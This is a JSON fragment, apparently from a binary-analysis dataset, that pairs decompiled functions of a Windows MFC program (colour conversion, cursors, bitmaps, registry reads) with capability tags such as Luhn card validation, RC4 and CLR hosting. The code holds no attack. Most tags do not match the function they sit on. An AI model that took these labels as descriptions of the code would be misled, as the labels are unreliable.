        "decompiled_code": "\nulong fcn.00410e48(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 306
    },
    "004022e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004022e0(uchar *param_1)\n\n{\n    float fVar1;\n    float fVar2;\n    float fVar3;\n    uchar uVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        if (*0x44e568 == *(param_1 + 8)) {\n            uVar4 = fcn.00410e48();\n            param_1[1] = uVar4;\n            *param_1 = uVar4;\n            param_1[2] = uVar4;\n            *(param_1 + 0x10) = 1;\n            return;\n        }\n        if (*(param_1 + 0xc) < *0x44e530 == (*(param_1 + 0xc) == *0x44e530)) {\n            fVar2 = (*(param_1 + 0xc) + *(param_1 + 8)) - *(param_1 + 0xc) * *(param_1 + 8);\n        }\n        else {\n            fVar2 = (*(param_1 + 8) + *0x44e534) * *(param_1 + 0xc);\n        }\n        fVar1 = (*(param_1 + 0xc) + *(param_1 + 0xc)) - fVar2;\n        uVar4 = fcn.00402070(fVar1, fVar2, *(param_1 + 4) + *0x44e55c);\n        *param_1 = uVar4;\n        uVar4 = fcn.00402070(fVar1, fVar2, *(param_1 + 4));\n        fVar3 = *(param_1 + 4) - *0x44e55c;\n        param_1[1] = uVar4;\n        uVar4 = fcn.00402070(fVar1, fVar2, fVar3);\n        param_1[2] = uVar4;\n        *(param_1 + 0x10) = 1;\n    }\n    return;\n}\n",
        "token_count": 455
    },
    "00402490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00402490(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.004290ee();\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    return param_1;\n}\n",
        "token_count": 87
    },
    "004024b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004024b0(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (param_2 == 0) {\n        fcn.00401100(0x80070057);\n    }\n    iVar2 = fcn.00410f48(param_2, param_2);\n    if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n        fcn.004018b0(iVar2);\n    }\n    fcn.00410ef1(*param_1, param_2, param_2);\n    if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = iVar2;\n        *(iVar2 + *param_1) = 0;\n        return;\n    }\n    fcn.00401100(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 246
    },
    "004025e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * fcn.004025e0(int32_t *param_1, char *param_2, int32_t *param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t **ppiVar7;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    piVar1 = param_3;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x44aca8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar3 = (**(**(*param_3 + -0x10) + 0x10))();\n    iVar4 = (**(*piVar3 + 0xc))();\n    param_3 = iVar4 + 0x10;\n    uStack4 = 0;\n    if (param_2 == NULL) {\n        iVar4 = 0;\n    }\n    else {\n        pcVar5 = param_2;\n        do {\n            cVar2 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar2 != '\\0');\n        iVar4 = pcVar5 - (param_2 + 1);\n    }\n    fcn.00402530(&param_3, param_2, iVar4, *piVar1, *(*piVar1 + -0xc));\n    iVar4 = param_3;\n    ppiVar7 = param_3 + -0x10;\n    iVar6 = fcn.00401900(ppiVar7);\n    *param_1 = iVar6 + 0x10;\n    uStack4 = 0xffffffff;\n    piVar1 = iVar4 + -4;\n    LOCK();\n    iVar4 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar4 == 1 || iVar4 + -1 < 0) {\n        (**(**ppiVar7 + 4))(ppiVar7);\n    }\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 493
    },
    "004026b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004026b0(uchar *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    uint *in_FS_OFFSET;\n    int32_t iStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x44acc8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    iStack16 = 0;\n    piVar2 = fcn.004290ee();\n    iStack16 = (**(*piVar2 + 0xc))();\n    iStack16 = iStack16 + 0x10;\n    uStack4 = 0;\n    fcn.004022e0();\n    fcn.004022e0();\n    fcn.004022e0();\n    fcn.004025c0(&iStack16, \"%02X%02X%02X\", *param_1, param_1[1], param_1[2]);\n    iVar1 = iStack16;\n    ppiVar4 = iStack16 + -0x10;\n    iVar3 = fcn.00401900(ppiVar4);\n    *param_2 = iVar3 + 0x10;\n    uStack4 = 0xffffffff;\n    piVar2 = iVar1 + -4;\n    LOCK();\n    iVar1 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar1 == 1 || iVar1 + -1 < 0) {\n        (**(**ppiVar4 + 4))(ppiVar4);\n    }\n    *in_FS_OFFSET = uStack12;\n    return param_2;\n}\n",
        "token_count": 413
    },
    "00402bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402bb0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x44adbb;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 5;\n    fcn.00406fe0();\n    uStack4._0_1_ = 4;\n    fcn.00406fe0();\n    uStack4._0_1_ = 3;\n    fcn.00406fe0();\n    uStack4._0_1_ = 2;\n    fcn.00406fe0();\n    uStack4._0_1_ = 1;\n    fcn.00406fe0();\n    uStack4 = uStack4._1_3_ << 8;\n    fcn.00403660();\n    uStack4 = 0xffffffff;\n    fcn.00428413();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 242
    },
    "00403660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403660(uint *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x44ae18;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x44e990;\n    uStack4 = 0;\n    if (param_1[0x15] != NULL) {\n        (**(*param_1[0x15] + 4))(1);\n    }\n    uStack4 = 0xffffffff;\n    fcn.0043ebb0();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 163
    },
    "00403800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.00403800(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack16;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x44ae62;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack12;\n    fcn.0042a5c9();\n    uStack4 = 0;\n    *param_1 = 0x44e990;\n    uVar1 = (*_sym.imp.USER32.dll_GetSysColor)(5);\n    param_1[0x14] = uVar1;\n    iVar2 = fcn.0042eabb(8);\n    uStack8 = CONCAT31(uStack8._1_3_, 1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00433fce(param_1[0x14]);\n        param_1[0x15] = uVar1;\n        *in_FS_OFFSET = iVar2;\n        return param_1;\n    }\n    param_1[0x15] = 0;\n    *in_FS_OFFSET = iStack16;\n    return param_1;\n}\n",
        "token_count": 307
    },
    "004038b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004038b0(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x44ae7a;\n    *in_FS_OFFSET = &uStack12;\n    *(param_1 + 0x50) = param_2;\n    if (*(param_1 + 0x54) != NULL) {\n        (**(**(param_1 + 0x54) + 4))(1);\n    }\n    iVar1 = fcn.0042eabb(8);\n    uStack4 = 0;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00433fce(*(param_1 + 0x50));\n    }\n    *(param_1 + 0x54) = uVar2;\n    if (param_3 != 0) {\n        (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x1c), 0, 1);\n    }\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 307
    },
    "00403f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403f60(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041101f(param_2);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401100(0x8007000e);\n    }\n    *param_1 = iVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "00403f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00403f90(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.0041101f(param_2 + 8);\n    if (puVar1 == NULL) {\n        return NULL;\n    }\n    *puVar1 = *param_1;\n    *param_1 = puVar1;\n    return puVar1 + 2;\n}\n",
        "token_count": 101
    },
    "00404680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404680(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x44afab;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 5;\n    fcn.00406fe0();\n    uStack4._0_1_ = 4;\n    fcn.00406fe0();\n    uStack4._0_1_ = 3;\n    fcn.00406fe0();\n    uStack4._0_1_ = 2;\n    fcn.00406fe0();\n    uStack4._0_1_ = 1;\n    fcn.00406fe0();\n    uStack4 = uStack4._1_3_ << 8;\n    fcn.00403660();\n    uStack4 = 0xffffffff;\n    fcn.00428413();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 241
    },
    "004050f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004050f0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uchar *puStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uchar auStack268 [244];\n    int32_t iStack24;\n    \n    puStack276 = &stack0xfffffef4;\n    uStack280 = 1;\n    uStack284 = 0;\n    uStack288 = param_2;\n    uStack292 = param_1;\n    puStack296 = 0x405110;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar2 == 0) {\n        puStack296 = &stack0xfffffee4;\n        uStack284 = 0x104;\n        iVar4 = iVar2;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueA)(uStack288, 0, &stack0xfffffee8);\n        pcVar3 = &stack0xfffffed8;\n        iStack24 = iStack24 - pcVar3;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3[iStack24] = cVar1;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar4);\n    }\n    return iVar2;\n}\n",
        "token_count": 347
    },
    "00405a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00405a70(int32_t param_1, uint param_2, int32_t *param_3)\n\n{\n    (*_sym.imp.GDI32.dll_GetTextExtentPoint32A)(*(param_1 + 8), *param_3, *(*param_3 + -0xc));\n    return;\n}\n",
        "token_count": 75
    },
    "00405ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00405ab0(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x44b045;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x44ef08;\n    uStack4 = 5;\n    if (param_1[0x23] != 0) {\n        (*_sym.imp.USER32.dll_DestroyCursor)(param_1[0x23]);\n    }\n    param_1[0x23] = 0;\n    fcn.00433ab0();\n    if ((param_1 + 0x18 != NULL) && (param_1[0x19] != 0)) {\n        fcn.00433ab0();\n    }\n    uStack4._0_1_ = 4;\n    fcn.0042417b();\n    uStack4._0_1_ = 3;\n    param_1[0x21] = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack4._0_1_ = 2;\n    param_1[0x1f] = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    ppiVar3 = param_1[0x1e] + -0x10;\n    uStack4._0_1_ = 1;\n    piVar1 = param_1[0x1e] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    uStack4 = uStack4._1_3_ << 8;\n    param_1[0x18] = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack4 = 0xffffffff;\n    fcn.0043ebb0();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 524
    },
    "004060b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.004060b0(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x44b0d5;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.0042a5c9();\n    *param_1 = 0x44ef08;\n    param_1[0x19] = 0;\n    param_1[0x18] = vtable.CBrush.0;\n    uStack4._0_1_ = 1;\n    uStack4._1_3_ = 0;\n    piVar1 = fcn.004290ee();\n    iVar2 = (**(*piVar1 + 0xc))();\n    param_1[0x1e] = iVar2 + 0x10;\n    param_1[0x20] = 0;\n    param_1[0x1f] = vtable.CFont.0;\n    param_1[0x22] = 0;\n    param_1[0x21] = vtable.CFont.0;\n    uStack4._0_1_ = 4;\n    fcn.0042410d();\n    uStack4 = CONCAT31(uStack4._1_3_, 5);\n    param_1[0x23] = 0;\n    param_1[0x14] = 0xee0000;\n    param_1[0x15] = 0x8b1a55;\n    param_1[0x16] = 0xff;\n    param_1[0x1a] = 0;\n    param_1[0x1b] = 0;\n    param_1[0x1c] = 0xffffffff;\n    param_1[0x1d] = 1;\n    fcn.00401b10(0x44da68, 0);\n    param_1[0x41] = 0;\n    param_1[0x43] = 0;\n    param_1[0x40] = 1;\n    param_1[0x42] = 1;\n    param_1[0x3f] = 100;\n    param_1[0x17] = 0xffffffff;\n    *in_FS_OFFSET = unaff_EBX;\n    return param_1;\n}\n",
        "token_count": 584
    },
    "004061f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004061f0(int32_t param_1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint uVar8;\n    char *unaff_EBP;\n    char *pcVar9;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x44b0e8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    if (*(param_1 + 0x8c) == 0) {\n        fcn.00444bf8();\n        pcVar2 = _sym.imp.USER32.dll_LoadCursorA;\n        iVar3 = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f89);\n        *(param_1 + 0x8c) = iVar3;\n        if (iVar3 != 0) goto code_r0x00406316;\n        piVar4 = fcn.004290ee();\n        iVar3 = (**(*piVar4 + 0xc))();\n        pcVar9 = iVar3 + 0x10;\n        uStack4 = 0;\n        if ((*(iVar3 + 8) - 0x104U | 1U - *(iVar3 + 0xc)) < 0) {\n            pcVar9 = unaff_EBP;\n            fcn.004018b0(0x104);\n        }\n        iVar3 = 0x104;\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(pcVar9);\n        if (pcVar9 == NULL) {\n            iVar5 = 0;\n        }\n        else {\n            pcVar6 = pcVar9;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = pcVar6 - (pcVar9 + 1);\n            if (iVar5 < 0) goto code_r0x00406326;\n        }\n        if (*(pcVar9 + -8) < iVar5) {\ncode_r0x00406326:\n            fcn.00401100(0x80070057);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        *(pcVar9 + -0xc) = iVar5;\n        pcVar9[iVar5] = '\\0';\n        fcn.00405e70(\"\\\\winhlp32.exe\", 0xd);\n        iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar3);\n        if (iVar5 != 0) {\n            iVar7 = (*pcVar2)(iVar5, 0x6a);\n            if (iVar7 != 0) {\n                uVar8 = (*_sym.imp.USER32.dll_CopyIcon)(iVar7);\n                *(param_1 + 0x8c) = uVar8;\n            }\n            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n        }\n        uStack4 = 0xffffffff;\n        piVar4 = iVar3 + -4;\n        LOCK();\n        iVar5 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**(iVar3 + -0x10) + 4))(iVar3 + -0x10);\n        }\n    }\ncode_r0x00406316:\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 825
    },
    "00406ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00406ab0(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code **ppcVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t *hdc;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x44b128;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack12;\n    fcn.0043307e();\n    uStack4 = 0;\n    *param_1 = 0x44f190;\n    if (param_2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = *(param_2 + 4);\n    }\n    uVar1 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(uVar1);\n    fcn.0043375c(uVar1);\n    ppcVar2 = fcn.0042eabb(8);\n    ppcVar5 = NULL;\n    if (ppcVar2 != NULL) {\n        ppcVar2[1] = NULL;\n        *ppcVar2 = vtable.CBitmap.0;\n        ppcVar5 = ppcVar2;\n    }\n    param_1[4] = ppcVar5;\n    iVar3 = hdc[3] - hdc[1];\n    uVar1 = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(*(param_2 + 4), hdc[2] - *hdc);\n    fcn.00433a59(uVar1);\n    iVar4 = param_1[4];\n    if (iVar4 != 0) {\n        iVar4 = *(iVar4 + 4);\n    }\n    uVar1 = fcn.00433b14(param_1[1], iVar4);\n    param_1[5] = uVar1;\n    param_1[6] = param_2;\n    param_1[7] = *hdc;\n    param_1[8] = hdc[1];\n    param_1[9] = hdc[2];\n    param_1[10] = hdc[3];\n    *in_FS_OFFSET = iVar3;\n    return param_1;\n}\n",
        "token_count": 532
    },
    "00406d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406d50(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x44b148;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack12;\n    *param_1 = 0x44f190;\n    iVar2 = param_1[8];\n    iVar1 = param_1[7];\n    iVar3 = param_1[9] - iVar1;\n    uStack4 = 0;\n    (*_sym.imp.GDI32.dll_BitBlt)\n              (*(param_1[6] + 4), iVar1, iVar2, iVar3, param_1[10] - iVar2, param_1[1], iVar1, iVar2, 0xcc0020);\n    iVar2 = param_1[5];\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + 4);\n    }\n    fcn.00433b14(param_1[1], iVar2);\n    if (param_1[4] != NULL) {\n        (**(*param_1[4] + 4))(1);\n    }\n    fcn.004337da();\n    *in_FS_OFFSET = iVar3;\n    return;\n}\n",
        "token_count": 321
    },
    "00406fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00406fe0(uint *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x44b1a0;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x44f208;\n    uStack4 = 4;\n    if (param_1[0x3d] != 0) {\n        (*_sym.imp.USER32.dll_DestroyCursor)(param_1[0x3d]);\n    }\n    param_1[0x3d] = 0;\n    if ((param_1 != 0xffffff2c) && (param_1[0x36] != 0)) {\n        fcn.00433ab0();\n    }\n    if ((param_1 + 0x37 != NULL) && (param_1[0x38] != 0)) {\n        fcn.00433ab0();\n    }\n    if ((param_1 + 0x39 != NULL) && (param_1[0x3a] != 0)) {\n        fcn.00433ab0();\n    }\n    if ((param_1 + 0x3b != NULL) && (param_1[0x3c] != 0)) {\n        fcn.00433ab0();\n    }\n    uStack4._0_1_ = 3;\n    param_1[0x3b] = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack4._0_1_ = 2;\n    param_1[0x39] = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack4._0_1_ = 1;\n    param_1[0x37] = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack4 = uStack4._1_3_ << 8;\n    param_1[0x35] = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack4 = 0xffffffff;\n    fcn.0042bd92();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 522
    },
    "00408070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408070(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint32_t uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack36;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack12 = *in_FS_OFFSET;\n    uStack8 = 0x44b240;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    iVar4 = param_1 + 0xd4;\n    if ((iVar4 != 0) && (*(param_1 + 0xd8) != 0)) {\n        fcn.00433ab0();\n    }\n    iVar3 = param_1 + 0xdc;\n    if ((iVar3 != 0) && (*(param_1 + 0xe0) != 0)) {\n        fcn.00433ab0();\n    }\n    if (*(param_1 + 0x104) != 0) {\n        fcn.00444bf8();\n        (*_sym.imp.USER32.dll_LoadBitmapA)();\n        fcn.00433a59();\n        iVar1 = *(param_1 + 0x13c);\n        fcn.00444bf8();\n        uStack108 = (-(iVar1 != 0) & 0xfffffffb) + 0xd1 & 0xffff;\n        uVar2 = (*_sym.imp.USER32.dll_LoadBitmapA)();\n        fcn.00433a59();\n        uStack96 = 0x408132;\n        fcn.004337f3(param_1);\n        uStack96 = 0x408143;\n        fcn.0043307e();\n        uStack96 = unaff_EBP;\n        uStack100 = 0x408153;\n        uStack100 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)();\n        iStack104 = 0x40815d;\n        fcn.0043375c();\n        if (iVar3 != 0) {\n            iVar3 = *(param_1 + 0xe0);\n        }\n        iStack104 = iVar3;\n        iVar3 = fcn.00433b14();\n        uVar5 = *(param_1 + 0xfc);\n        fcn.00407fd0(&stack0xffffffa4, uVar5);\n        if (iVar4 != 0) {\n            iVar4 = *(param_1 + 0xd8);\n        }\n        fcn.00433b14(uStack96, iVar4);\n        fcn.00407fd0(&stack0xffffff94, *(param_1 + 0xf8));\n        if (iVar3 != 0) {\n            iVar3 = *(iVar3 + 4);\n        }\n        fcn.00433b14(uVar5, iVar3);\n        fcn.004337da();\n        fcn.0043384e();\n        *in_FS_OFFSET = uVar2;\n        return;\n    }\n    fcn.00444bf8();\n    (*_sym.imp.USER32.dll_LoadBitmapA)();\n    fcn.00433a59();\n    fcn.00444bf8();\n    (*_sym.imp.USER32.dll_LoadBitmapA)();\n    fcn.00433a59();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 774
    },
    "00408340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408340(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    fcn.00407ef0();\n    iVar1 = *(param_1 + 0x70);\n    iVar2 = fcn.00410e48();\n    *(param_1 + 100) = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 100) = 0;\n    }\n    if (*(param_1 + 100) != iVar1 && iVar1 <= *(param_1 + 100)) {\n        *(param_1 + 100) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 151
    },
